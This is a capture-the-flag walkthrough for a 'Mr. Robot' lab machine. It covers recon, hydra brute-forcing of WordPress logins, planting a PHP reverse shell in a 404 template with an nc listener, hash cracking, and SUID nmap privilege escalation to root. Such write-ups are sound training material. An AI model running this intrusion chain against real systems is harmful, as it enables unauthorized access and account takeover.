# Mr. Robot

Notes on the CTF.

## Recon

### nmap 

`nmap -A TARGET_IP`

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 02:E1:1E:47:30:93 (Unknown)
Device type: general purpose|specialized|storage-misc|WAP|broadband router|printer
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (96%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3.13 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:3 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.13 (96%), Linux 3.10 - 4.8 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%), Linux 4.2 (89%), HP P2000 G3 NAS device (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms ip-10-10-200-158.eu-west-1.compute.internal (TARGET_IP)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.28 seconds
```

### gobuster
There is a lot of output. 

`$ gobuster dir -u TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

```
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/video (Status: 301)
/0 (Status: 301)
/feed (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
```


### website

`80` and `443` host the same site, it has an interactive thing that is designed to look like a terminal. The source code doesn't have anything useful. 

Putting in an invalid subdirectory shows us that it is a Wordpress site. 

This leads to a login page:
http://TARGET_IP/wp-login.php ...


http://TARGET_IP/robots:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

http://TARGET_IP/fsocity.dic is a wordlist (careful: fsocity != fsociety)


## Getting onto the site

Try logging in with any test credentials and capture the request in BurpSuite.
http://TARGET_IP/wp-login.php 

```
POST /wp-login.php HTTP/1.1
Host: TARGET_IP
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: http://TARGET_IP
Connection: close
Referer: http://TARGET_IP/wp-login.php
Cookie: wordpress_test_cookie=WP+Cookie+check; s_cc=true; s_fid=28D2771EFD4C007C-10EA05B4F63E34A4; s_nr=1687561484752; s_sq=%5B%5BB%5D%5D
Upgrade-Insecure-Requests: 1

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwp-admin%2F&testcookie=1
```
### hydra
For username:

`$ hydra -L fsocity.dic -p test TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"`

```
[80][http-post-form] host: TARGET_IP   login: Elliot   password: test
```

For password:

`$ tac fsocity.dic > f2.dic` to reverse wordlist. I will run a dictionary attack from both sides. 

`$ hydra -l Elliot -P fsocity.dic TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect."`

`$ hydra -l Elliot -P f2.dic TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect."`


`[80][http-post-form] host: TARGET_IP   login: Elliot   password: ER28-0652`

## Gaining access to the machine

Version 4.3.1

`.php`, `.phtml`, is not allowed to be uploaded on a Wordpress post. 

`http://TARGET_IP/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen` by going to Appearance -> Editor -> 404 template.
Paste a PHP reverse shell into template. 

`$ nc -nvlp 9001`

Got to http://TARGET_IP/notarealpage to get the 404 PHP to run. We now have a shell as daemon. 

### Stabalize the shell

`$ python3 -c 'import pty;pty.spawn("/bin/bash")'`
Ctrl+z
`$ stty raw -echo; fg`
`$ export TERM=xterm`


## Escalation

`/home/robot`

```
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

`$ hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt`

abcdefghijklmnopqrstuvwxyz

`$ su robot`


### Exploring options

Go back to daemon.

`$ uname -a`
```
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
```
CVE-2015-8660?

`$ find / -perm -4000 2>/dev/null`

```
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

`/usr/local/bin/nmap` is out of the ordinary.
https://gtfobins.github.io/gtfobins/nmap/#suid

`$ nmap --interactive`

`> !sh` (Doesn't work with `!bash`)

And now we have root. 
